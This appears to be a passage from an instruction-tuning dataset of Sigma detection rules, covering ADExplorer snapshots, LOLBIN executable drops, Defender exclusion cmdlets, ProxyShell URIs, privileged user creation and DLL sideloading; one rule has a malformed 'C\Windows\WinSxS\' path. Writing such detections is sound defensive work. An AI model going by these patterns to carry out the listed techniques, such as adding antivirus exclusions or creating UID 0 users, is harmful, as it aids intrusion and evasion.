    "instruction": "Build a Sigma rule with the goal of detecting execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database, you should: Look for processes that have been created on Windows systems which either have an Image name ending with '\\ADExplorer.exe' or an OriginalFileName value of 'AdExp'. Additionally, check if the CommandLine argument contains the substring 'snapshot'. This detection aims at identifying instances where ADExplorer, a tool made by Sysinternals, is utilized in ways that potentially could be part of unauthorized or malicious activities, specifically focusing on capturing snapshots of the Active Directory database. The targeted log source for this detection is process creation events on Windows systems. It's important to note that the confidence level of this rule is marked as medium, and situations not fitting the described pattern could arise, leading to unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ADExplorer.exe'\n        - OriginalFileName: 'AdExp'\n    selection_cli:\n        CommandLine|contains: 'snapshot'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ADExplorer.exe'\n        - OriginalFileName: 'AdExp'\n    selection_cli:\n        CommandLine|contains: 'snapshot'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database.",
      "answer": "In order to detect the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database, you should: Look for processes that have been created on Windows systems which either have an Image name ending with '\\ADExplorer.exe' or an OriginalFileName value of 'AdExp'. Additionally, check if the CommandLine argument contains the substring 'snapshot'. This detection aims at identifying instances where ADExplorer, a tool made by Sysinternals, is utilized in ways that potentially could be part of unauthorized or malicious activities, specifically focusing on capturing snapshots of the Active Directory database. The targeted log source for this detection is process creation events on Windows systems. It's important to note that the confidence level of this rule is marked as medium, and situations not fitting the described pattern could arise, leading to unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting programs on a Windows system that should not write executables to disk.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect programs on a Windows system that should not write executables to disk, you should monitor file event logs for instances where certain programs create or modify executable files (.exe, .dll, .ocx). Specifically, keep an eye on the activities of Microsoft Office programs like eqnedt32.exe, wordpad.exe, and wordview.exe, which do not typically involve dropping executables. Additionally, watch out for the use of legitimate Windows utilities (often referred to as LOLBINs - Living Off the Land Binaries) such as certutil.exe, certoc.exe, CertReq.exe, Desktopimgdownldr.exe, esentutl.exe, and mshta.exe, as these can be abused to download or generate executable files but usually should not do so. Moreover, pay attention if executable files are created or altered by processes with names like AcroRd32.exe, RdrCEF.exe, hh.exe, and finger.exe; these are especially suspicious as they normally should never be involved in such actions, indicating potential process injection or masquerading malware. Be aware that detecting these activities necessitates a high level of alertness due to the potential for false positives being unknown, indicating that while anomalies might be rare, each detection should be investigated thoroughly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith:\n            # Microsoft Office Programs Dropping Executables / Rest of the apps are covered in: c7a74c80-ba5a-486e-9974-ab9e682bc5e4\n            - '\\eqnedt32.exe'\n            - '\\wordpad.exe'\n            - '\\wordview.exe'\n            # LOLBINs that can be used to download executables\n            - '\\certutil.exe'\n            - '\\certoc.exe'\n            - '\\CertReq.exe'\n            #- \\bitsadmin.exe (depends on the environment; comment in if you're sure that bitsadmin doesn't do that in your env)\n            - '\\Desktopimgdownldr.exe'\n            - '\\esentutl.exe'\n            #- \\expand.exe\n            - '\\mshta.exe'\n            # Executables that should never drop an executable to disk (but may after a previous process injection or if it's malware that uses a legitimate name)\n            - '\\AcroRd32.exe'\n            - '\\RdrCEF.exe'\n            - '\\hh.exe'\n            - '\\finger.exe'\n        TargetFilename|endswith:\n            - '.exe'\n            - '.dll'\n            - '.ocx'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith:\n            # Microsoft Office Programs Dropping Executables / Rest of the apps are covered in: c7a74c80-ba5a-486e-9974-ab9e682bc5e4\n            - '\\eqnedt32.exe'\n            - '\\wordpad.exe'\n            - '\\wordview.exe'\n            # LOLBINs that can be used to download executables\n            - '\\certutil.exe'\n            - '\\certoc.exe'\n            - '\\CertReq.exe'\n            #- \\bitsadmin.exe (depends on the environment; comment in if you're sure that bitsadmin doesn't do that in your env)\n            - '\\Desktopimgdownldr.exe'\n            - '\\esentutl.exe'\n            #- \\expand.exe\n            - '\\mshta.exe'\n            # Executables that should never drop an executable to disk (but may after a previous process injection or if it's malware that uses a legitimate name)\n            - '\\AcroRd32.exe'\n            - '\\RdrCEF.exe'\n            - '\\hh.exe'\n            - '\\finger.exe'\n        TargetFilename|endswith:\n            - '.exe'\n            - '.dll'\n            - '.ocx'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "programs on a Windows system that should not write executables to disk",
      "answer": "In order to detect programs on a Windows system that should not write executables to disk, you should monitor file event logs for instances where certain programs create or modify executable files (.exe, .dll, .ocx). Specifically, keep an eye on the activities of Microsoft Office programs like eqnedt32.exe, wordpad.exe, and wordview.exe, which do not typically involve dropping executables. Additionally, watch out for the use of legitimate Windows utilities (often referred to as LOLBINs - Living Off the Land Binaries) such as certutil.exe, certoc.exe, CertReq.exe, Desktopimgdownldr.exe, esentutl.exe, and mshta.exe, as these can be abused to download or generate executable files but usually should not do so. Moreover, pay attention if executable files are created or altered by processes with names like AcroRd32.exe, RdrCEF.exe, hh.exe, and finger.exe; these are especially suspicious as they normally should never be involved in such actions, indicating potential process injection or masquerading malware. Be aware that detecting these activities necessitates a high level of alertness due to the potential for false positives being unknown, indicating that while anomalies might be rare, each detection should be investigated thoroughly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect requests to exclude files, folders, or processes from Antivirus scanning using PowerShell cmdlets, you should monitor for the creation of processes on Windows systems that involve the use of specific PowerShell cmdlets known to alter antivirus preferences. Specifically, watch for processes invoking the `Add-MpPreference` or `Set-MpPreference` cmdlets. These cmdlets are indicative of attempts to change Microsoft Defender Antivirus settings. Within these commands, the presence of parameters such as `-ExclusionPath`, `-ExclusionExtension`, `-ExclusionProcess`, or `-ExclusionIpAddress` should be considered a strong indicator of an attempt to modify the antivirus configurations to exclude certain paths, file extensions, processes, or IP addresses from being scanned. This behavior can be leveraged by attackers to reduce the security posture of a system by ensuring their malicious files or activities are not scanned by the antivirus software. Be aware that there could be false positives, such as legitimate administrative activity or other cmdlets that may use similar parameters for benign purposes. Therefore, the severity level is considered medium, suggesting that while detections should be investigated, they may not always represent malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection2:\n        CommandLine|contains:\n            - ' -ExclusionPath '\n            - ' -ExclusionExtension '\n            - ' -ExclusionProcess '\n            - ' -ExclusionIpAddress '\n    condition: all of selection*\nfalsepositives:\n    - Possible Admin Activity\n    - Other Cmdlets that may use the same parameters\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection2:\n        CommandLine|contains:\n            - ' -ExclusionPath '\n            - ' -ExclusionExtension '\n            - ' -ExclusionProcess '\n            - ' -ExclusionIpAddress '\n    condition: all of selection*\nfalsepositives:\n    - Possible Admin Activity\n    - Other Cmdlets that may use the same parameters\nlevel: medium\n",
      "question": "requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets",
      "answer": "In order to detect requests to exclude files, folders, or processes from Antivirus scanning using PowerShell cmdlets, you should monitor for the creation of processes on Windows systems that involve the use of specific PowerShell cmdlets known to alter antivirus preferences. Specifically, watch for processes invoking the `Add-MpPreference` or `Set-MpPreference` cmdlets. These cmdlets are indicative of attempts to change Microsoft Defender Antivirus settings. Within these commands, the presence of parameters such as `-ExclusionPath`, `-ExclusionExtension`, `-ExclusionProcess`, or `-ExclusionIpAddress` should be considered a strong indicator of an attempt to modify the antivirus configurations to exclude certain paths, file extensions, processes, or IP addresses from being scanned. This behavior can be leveraged by attackers to reduce the security posture of a system by ensuring their malicious files or activities are not scanned by the antivirus software. Be aware that there could be false positives, such as legitimate administrative activity or other cmdlets that may use similar parameters for benign purposes. Therefore, the severity level is considered medium, suggesting that while detections should be investigated, they may not always represent malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy, you should: focus on observing process creation events within Windows environments. Specifically, watch for processes that end with '\\gpscript.exe' or have the original file name 'GPSCRIPT.EXE'. These processes are particular interest if they are initiated with a command line that includes ' /logon' or ' /startup', indicating they are being used to execute logon or startup scripts as configured in a Group Policy. However, it's crucial to filter out and not raise alerts if these processes stem from the parent command line 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc', as this is a legitimate use case associated with the main service host process for networking services. Be aware, though, that there could be legitimate uses of logon scripts distributed via group policy, which could lead to potential false positives. The level of concern for such detections is considered medium, underscoring the need for careful analysis of detected events to distinguish between malicious use and legitimate administrative activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\gpscript.exe'\n        - OriginalFileName: 'GPSCRIPT.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ' /logon'\n            - ' /startup'\n    filter_main_svchost:\n        ParentCommandLine: 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate uses of logon scripts distributed via group policy\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\gpscript.exe'\n        - OriginalFileName: 'GPSCRIPT.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ' /logon'\n            - ' /startup'\n    filter_main_svchost:\n        ParentCommandLine: 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate uses of logon scripts distributed via group policy\nlevel: medium\n",
      "question": "execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy",
      "answer": "In order to detect the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy, you should: focus on observing process creation events within Windows environments. Specifically, watch for processes that end with '\\gpscript.exe' or have the original file name 'GPSCRIPT.EXE'. These processes are particular interest if they are initiated with a command line that includes ' /logon' or ' /startup', indicating they are being used to execute logon or startup scripts as configured in a Group Policy. However, it's crucial to filter out and not raise alerts if these processes stem from the parent command line 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc', as this is a legitimate use case associated with the main service host process for networking services. Be aware, though, that there could be legitimate uses of logon scripts distributed via group policy, which could lead to potential false positives. The level of concern for such detections is considered medium, underscoring the need for careful analysis of detected events to distinguish between malicious use and legitimate administrative activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting URP patterns and status codes that indicate a successful ProxyShell exploitation attack against Exchange servers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect URP patterns and status codes that indicate a successful ProxyShell exploitation attack against Exchange servers, you should monitor webserver logs for specific Uniform Resource Identifier (URI) query patterns and HTTP status codes. Focus on detecting any URIs that contain '/autodiscover.json', which may indicate an attempt to automate discovery of server capabilities. Furthermore, take note of other specific URI queries such as '/powershell', '/mapi/nspi', '/EWS', and 'X-Rps-CAT', which are associated with different functionalities of Exchange servers and may be targeted in a ProxyShell attack.\n\nYou should also pay close attention to the status codes in the server responses. Specifically, look for HTTP status codes 200 and 301. A status code of 200 indicates that the request has succeeded, while a status code of 301 signals that the requested resource has been moved permanently to a new location. The appearance of these status codes in conjunction with the specified URI patterns strongly suggests a successful exploitation attempt.\n\nGiven the critical nature of such attacks, which could potentially lead to unauthorized access to sensitive information or further network compromise, it is crucial to monitor and investigate these indicators promptly. An unexpected appearance of these URI patterns or status codes, especially in a correlated manner, should raise immediate alerts for further investigation due to the possibility of a ProxyShell attack being actively executed against your Exchange servers. \n\nThis detection technique is essential for identifying the exploitation of vulnerabilities within Exchange servers, allowing you to respond quickly and mitigate potential impacts. It is also critical to note that while these indicators are highly indicative of ProxyShell exploitation attempts, there may be unknown false positives, and each alert should be thoroughly investigated.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection_auto:\n        cs-uri-query|contains: '/autodiscover.json'\n    selection_uri:\n        cs-uri-query|contains:\n            - '/powershell'\n            - '/mapi/nspi'\n            - '/EWS'\n            - 'X-Rps-CAT'\n    selection_success:\n        sc-status:\n            - 200\n            - 301\n    condition: selection_auto and selection_uri and selection_success\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection_auto:\n        cs-uri-query|contains: '/autodiscover.json'\n    selection_uri:\n        cs-uri-query|contains:\n            - '/powershell'\n            - '/mapi/nspi'\n            - '/EWS'\n            - 'X-Rps-CAT'\n    selection_success:\n        sc-status:\n            - 200\n            - 301\n    condition: selection_auto and selection_uri and selection_success\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "URP patterns and status codes that indicate a successful ProxyShell exploitation attack against Exchange servers",
      "answer": "In order to detect URP patterns and status codes that indicate a successful ProxyShell exploitation attack against Exchange servers, you should monitor webserver logs for specific Uniform Resource Identifier (URI) query patterns and HTTP status codes. Focus on detecting any URIs that contain '/autodiscover.json', which may indicate an attempt to automate discovery of server capabilities. Furthermore, take note of other specific URI queries such as '/powershell', '/mapi/nspi', '/EWS', and 'X-Rps-CAT', which are associated with different functionalities of Exchange servers and may be targeted in a ProxyShell attack.\n\nYou should also pay close attention to the status codes in the server responses. Specifically, look for HTTP status codes 200 and 301. A status code of 200 indicates that the request has succeeded, while a status code of 301 signals that the requested resource has been moved permanently to a new location. The appearance of these status codes in conjunction with the specified URI patterns strongly suggests a successful exploitation attempt.\n\nGiven the critical nature of such attacks, which could potentially lead to unauthorized access to sensitive information or further network compromise, it is crucial to monitor and investigate these indicators promptly. An unexpected appearance of these URI patterns or status codes, especially in a correlated manner, should raise immediate alerts for further investigation due to the possibility of a ProxyShell attack being actively executed against your Exchange servers. \n\nThis detection technique is essential for identifying the exploitation of vulnerabilities within Exchange servers, allowing you to respond quickly and mitigate potential impacts. It is also critical to note that while these indicators are highly indicative of ProxyShell exploitation attempts, there may be unknown false positives, and each alert should be thoroughly investigated."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious log entries in Linux log files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious log entries in Linux log files, you should: monitor Linux log sources for specific keywords that may indicate malicious activity or system misconfiguration. These suspicious keywords include \"entered promiscuous mode,\" which could suggest network eavesdropping or sniffing activities. Also, be on the lookout for log entries such as \"Deactivating service,\" which may indicate unauthorized attempts to disable critical services, potentially as a part of a larger attack strategy. Furthermore, the appearance of \"Oversized packet received from\" might signal an attempt at exploiting buffer overflow vulnerabilities, and the message \"imuxsock begins to drop messages\" could suggest a system is under stress or attack attempt, overwhelming the log message buffer. All these entries in the logs should be treated with caution, keeping in mind there is a potential for false positives. However, given the medium level of concern associated with these indicators, they warrant further investigation to ensure the system's integrity and security.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    keywords:\n        # Generic suspicious log lines\n        - entered promiscuous mode\n        # OSSEC https://github.com/ossec/ossec-hids/blob/master/etc/rules/syslog_rules.xml\n        - Deactivating service\n        - Oversized packet received from\n        - imuxsock begins to drop messages\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    keywords:\n        # Generic suspicious log lines\n        - entered promiscuous mode\n        # OSSEC https://github.com/ossec/ossec-hids/blob/master/etc/rules/syslog_rules.xml\n        - Deactivating service\n        - Oversized packet received from\n        - imuxsock begins to drop messages\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "suspicious log entries in Linux log files",
      "answer": "In order to detect suspicious log entries in Linux log files, you should: monitor Linux log sources for specific keywords that may indicate malicious activity or system misconfiguration. These suspicious keywords include \"entered promiscuous mode,\" which could suggest network eavesdropping or sniffing activities. Also, be on the lookout for log entries such as \"Deactivating service,\" which may indicate unauthorized attempts to disable critical services, potentially as a part of a larger attack strategy. Furthermore, the appearance of \"Oversized packet received from\" might signal an attempt at exploiting buffer overflow vulnerabilities, and the message \"imuxsock begins to drop messages\" could suggest a system is under stress or attack attempt, overwhelming the log message buffer. All these entries in the logs should be treated with caution, keeping in mind there is a potential for false positives. However, given the medium level of concern associated with these indicators, they warrant further investigation to ensure the system's integrity and security."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting addition of a new user to a privileged group such as \"root\" or \"sudo\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the addition of a new user to a privileged group such as \"root\" or \"sudo\", you should monitor for specific events within Linux system log files. These files, depending on the Linux distribution, are typically located at '/var/log/secure' on REHL systems or '/var/log/auth.log' on Debian-like systems. The event logs of interest are those documenting the creation of new user accounts, specifically the use of the 'useradd' command which could signal an unauthorized attempt to gain elevated privileges on the system.\n\nThe detection focuses on identifying logs that indicate the creation of a new user with attributes that align with membership to critical system groups. Critical attributes to watch for include the User ID (UID) set to 0, which represents the root user, or the Group ID (GID) being set to values such as 0 (root group), 10 (wheel group), or 27 (sudo group). Any combination of these UID and GID values in a user creation log entry may suggest an attempt to add a potentially malicious user with administrative privileges.\n\nIt is also essential to be aware that there could be legitimate reasons for these actions, classified as false positives. Such instances might include routine administrative activity where a system administrator is creating accounts for genuine purposes. The detection mechanism's sensitivity is considered high due to the significant security implications associated with unauthorized individuals gaining elevated access rights.\n\nMonitoring for and analyzing these specific log entries can play a crucial role in identifying and responding to potential security breaches involving the unauthorized addition of users to privileged groups on Linux systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    definition: '/var/log/secure on REHL systems or /var/log/auth.log on debian like Systems needs to be collected in order for this detection to work'\ndetection:\n    # Example of the events that could be observed when matching these would be as follow\n    #   Dec 21 16:42:19 testserver useradd[1337]: new user: name=butter1, UID=1000, GID=0, home=/root, shell=/bin/bash\n    #   Dec 21 17:13:54 testserver useradd[1337]: new user: name=john, UID=0, GID=0, home=/home/john, shell=/bin/bash\n    #   Dec 21 17:24:40 testserver useradd[1337]: new user: name=butter3, UID=1000, GID=10, home=/home/butter3, shell=/bin/bash\n    #   Dec 21 17:30:22 testserver useradd[1337]: new user: name=butter4, UID=1000, GID=27, home=/home/butter4, shell=/bin/bash\n    selection_new_user:\n        - 'new user'\n    selection_uids_gids:\n        - 'GID=0' # root group\n        - 'UID=0' # root UID\n        - 'GID=10' # wheel group\n        - 'GID=27' # sudo group\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    definition: '/var/log/secure on REHL systems or /var/log/auth.log on debian like Systems needs to be collected in order for this detection to work'\ndetection:\n    # Example of the events that could be observed when matching these would be as follow\n    #   Dec 21 16:42:19 testserver useradd[1337]: new user: name=butter1, UID=1000, GID=0, home=/root, shell=/bin/bash\n    #   Dec 21 17:13:54 testserver useradd[1337]: new user: name=john, UID=0, GID=0, home=/home/john, shell=/bin/bash\n    #   Dec 21 17:24:40 testserver useradd[1337]: new user: name=butter3, UID=1000, GID=10, home=/home/butter3, shell=/bin/bash\n    #   Dec 21 17:30:22 testserver useradd[1337]: new user: name=butter4, UID=1000, GID=27, home=/home/butter4, shell=/bin/bash\n    selection_new_user:\n        - 'new user'\n    selection_uids_gids:\n        - 'GID=0' # root group\n        - 'UID=0' # root UID\n        - 'GID=10' # wheel group\n        - 'GID=27' # sudo group\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
      "question": "addition of a new user to a privileged group such as \"root\" or \"sudo\"",
      "answer": "In order to detect the addition of a new user to a privileged group such as \"root\" or \"sudo\", you should monitor for specific events within Linux system log files. These files, depending on the Linux distribution, are typically located at '/var/log/secure' on REHL systems or '/var/log/auth.log' on Debian-like systems. The event logs of interest are those documenting the creation of new user accounts, specifically the use of the 'useradd' command which could signal an unauthorized attempt to gain elevated privileges on the system.\n\nThe detection focuses on identifying logs that indicate the creation of a new user with attributes that align with membership to critical system groups. Critical attributes to watch for include the User ID (UID) set to 0, which represents the root user, or the Group ID (GID) being set to values such as 0 (root group), 10 (wheel group), or 27 (sudo group). Any combination of these UID and GID values in a user creation log entry may suggest an attempt to add a potentially malicious user with administrative privileges.\n\nIt is also essential to be aware that there could be legitimate reasons for these actions, classified as false positives. Such instances might include routine administrative activity where a system administrator is creating accounts for genuine purposes. The detection mechanism's sensitivity is considered high due to the significant security implications associated with unauthorized individuals gaining elevated access rights.\n\nMonitoring for and analyzing these specific log entries can play a crucial role in identifying and responding to potential security breaches involving the unauthorized addition of users to privileged groups on Linux systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of stdin to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of stdin to execute PowerShell, you should: Monitor Windows PowerShell script block logging for specific patterns indicating unusual use. The focus is on identifying execution scenarios where command prompt (`cmd`) is used in combination with PowerShell in a manner that suggests obfuscation. Specifically, look for script block texts that involve the `cmd` command with switches `/c` or `/r` followed closely (within five characters) by `powershell` and further include either the presence of `${input}`, `input`, or the `noexit` flag within a string. This pattern suggests an attempt to execute PowerShell commands or scripts in a way that might obscure their purpose or origin, representing a potential security risk. Such activities are tagged with tactics and techniques commonly associated with malicious actions, including \"Execution\" and \"Defense Evasion\". Monitoring for these specific script block texts requires that Script Block Logging be enabled on the Windows system, ensuring that detailed records of PowerShell execution are available for analysis. Be aware that there might be unknown scenarios that could trigger similar patterns without malicious intent; however, given the high level of concern, each detection should be investigated thoroughly.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_4104:\n        ScriptBlockText|re: '.*cmd.{0,5}(?:/c|/r).+powershell.+(?:\\$?\\{?input\\}?|noexit).+\"'\n    condition: selection_4104\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_4104:\n        ScriptBlockText|re: '.*cmd.{0,5}(?:/c|/r).+powershell.+(?:\\$?\\{?input\\}?|noexit).+\"'\n    condition: selection_4104\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of stdin to execute PowerShell",
      "answer": "In order to detect obfuscated use of stdin to execute PowerShell, you should: Monitor Windows PowerShell script block logging for specific patterns indicating unusual use. The focus is on identifying execution scenarios where command prompt (`cmd`) is used in combination with PowerShell in a manner that suggests obfuscation. Specifically, look for script block texts that involve the `cmd` command with switches `/c` or `/r` followed closely (within five characters) by `powershell` and further include either the presence of `${input}`, `input`, or the `noexit` flag within a string. This pattern suggests an attempt to execute PowerShell commands or scripts in a way that might obscure their purpose or origin, representing a potential security risk. Such activities are tagged with tactics and techniques commonly associated with malicious actions, including \"Execution\" and \"Defense Evasion\". Monitoring for these specific script block texts requires that Script Block Logging be enabled on the Windows system, ensuring that detailed records of PowerShell execution are available for analysis. Be aware that there might be unknown scenarios that could trigger similar patterns without malicious intent; however, given the high level of concern, each detection should be investigated thoroughly."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Microsoft Cloud App Security reported a risky sign-in attempt due to a login associated with an impossible travel..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a Microsoft Cloud App Security reported a risky sign-in attempt due to a login associated with an impossible travel, you should monitor logs generated by the threat management system for Microsoft 365 services. Specifically, focus on logs coming from the Security Compliance Center. The key event to look out for is labeled as \"Impossible travel activity\" and must have a status indicating success. This detection aims to identify when a user's credentials have been used to attempt sign-ins from geographical locations that are physically impossible to travel between within the time frame of the sign-in attempts. It is important to note that while this is a medium-level security alert, there may be unknown scenarios that could trigger false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: threat_management\n    product: m365\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'Impossible travel activity'\n        status: success\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: threat_management\n    product: m365\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'Impossible travel activity'\n        status: success\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Microsoft Cloud App Security reported a risky sign-in attempt due to a login associated with an impossible travel.",
      "answer": "In order to detect when a Microsoft Cloud App Security reported a risky sign-in attempt due to a login associated with an impossible travel, you should monitor logs generated by the threat management system for Microsoft 365 services. Specifically, focus on logs coming from the Security Compliance Center. The key event to look out for is labeled as \"Impossible travel activity\" and must have a status indicating success. This detection aims to identify when a user's credentials have been used to attempt sign-ins from geographical locations that are physically impossible to travel between within the time frame of the sign-in attempts. It is important to note that while this is a medium-level security alert, there may be unknown scenarios that could trigger false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of \"edputil.dll\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of \"edputil.dll\", you should focus on monitoring image load activities within Windows systems. Specifically, watch for instances where \"edputil.dll\" is loaded outside the standard Windows directories, which include \"C:\\Windows\\System32\\\", \"C:\\Windows\\SysWOW64\\\", and \"C\\Windows\\WinSxS\\\". This monitoring is achieved by examining if the loaded image's path ends with \"\\edputil.dll\" but does not start with any of the aforementioned trusted Windows paths. Such activities are often associated with malicious efforts to sideload DLLs, which can be a technique used by adversaries to execute arbitrary code or compromise systems. The likelihood of these observations being false positives is considered low, and the associated risk level is rated high.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\edputil.dll'\n    filter_main_generic:\n        ImageLoaded|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C\\Windows\\WinSxS\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\edputil.dll'\n    filter_main_generic:\n        ImageLoaded|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C\\Windows\\WinSxS\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential DLL sideloading of \"edputil.dll\"",
      "answer": "In order to detect potential DLL sideloading of \"edputil.dll\", you should focus on monitoring image load activities within Windows systems. Specifically, watch for instances where \"edputil.dll\" is loaded outside the standard Windows directories, which include \"C:\\Windows\\System32\\\", \"C:\\Windows\\SysWOW64\\\", and \"C\\Windows\\WinSxS\\\". This monitoring is achieved by examining if the loaded image's path ends with \"\\edputil.dll\" but does not start with any of the aforementioned trusted Windows paths. Such activities are often associated with malicious efforts to sideload DLLs, which can be a technique used by adversaries to execute arbitrary code or compromise systems. The likelihood of these observations being false positives is considered low, and the associated risk level is rated high."
    }
  },
  {
